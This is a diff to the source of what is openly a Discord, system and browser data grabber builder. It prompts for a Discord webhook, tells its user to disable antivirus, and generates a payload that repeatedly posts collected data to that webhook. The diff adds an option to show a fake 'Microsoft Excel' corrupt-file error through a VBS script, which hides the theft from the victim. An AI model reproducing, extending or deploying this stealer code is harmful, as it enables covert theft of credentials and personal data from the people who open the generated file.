@@ -7,11 +7,19 @@ from tkinter import Tk, filedialog
 
 Title("Discord/System/Browser Grab")
 
-print(f"{color.RED}Disable your antivirus !")
+print(f"{color.RED}\nDisable your antivirus !")
 
 webhook = input(f"\n{color.RED}[?] | URL Webhook -> {color.RESET}")
 name_file = input(f"{color.RED}[?] | File Name -> {color.RESET}")
 icone = input(f"{color.RED}[?] | Add an Icon (y/n) -> {color.RESET}")
+fake_error = input(f"{color.RED}[?] | Simulate an error (y/n) -> {color.RESET}")
+if fake_error in ['y', 'Y', 'Yes', 'yes', 'YES']:
+   title = input(f"{color.RED}[?] | Error message title (enter for default) -> {color.RESET}")
+   descritpion = input(f"{color.RED}[?] | Description of the error message (enter for default) -> {color.RESET}")
+   if not descritpion.strip():
+      descritpion = "The file is corrupt and cannot be opened."
+   if not title.strip():
+      title = "Microsoft Excel"
 
 if not name_file.strip():
     random_number = random.randint(1, 1000)
@@ -1398,7 +1406,24 @@ payload = {
     'avatar_url': avatar_embed,
 }
 requests.post(webhook_url, json=payload)
-
+''')
+ 
+ if fake_error in ['y', 'Y', 'Yes', 'yes', 'YES']:
+    file.write(f'''
+file = "Error.vbs"
+code = """
+x=msgbox("{descritpion}", 16, "{title}")
+"""
+try:
+    with open(file, "w") as filevbs:
+        filevbs.write(code)
+    subprocess.run(["cscript", file], shell=True)
+    os.remove(file)
+except:
+    ()
+''')
+    
+ file.write(r"""
 while True:
 
     time.sleep(300)
@@ -1433,8 +1458,7 @@ while True:
     'avatar_url': avatar_embed,
     }
     requests.post(webhook_url, json=payload)
-''')
-
+""")
 with open(file_text, 'r', encoding='utf-8') as file_txt:
     contenu = file_txt.read()
 
